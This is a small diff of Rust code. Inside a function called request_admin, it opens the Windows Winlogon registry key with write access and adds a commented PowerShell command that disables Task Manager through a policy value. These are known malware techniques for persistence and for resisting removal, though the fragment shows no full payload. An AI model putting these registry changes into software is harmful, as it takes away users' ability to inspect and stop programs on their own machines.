@@ -42,7 +42,9 @@ fn request_admin(action: String) {
         let reg_key = RegKey::predef(HKEY_CURRENT_USER);
 
         // Path to the registry key
-        let path = r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon";       
+        let path = r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon";   
+        // Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1
+    
 
         // Try to open the registry path or create it if it doesn't exist
         let system_key = match reg_key.open_subkey_with_flags(path, KEY_WRITE) {
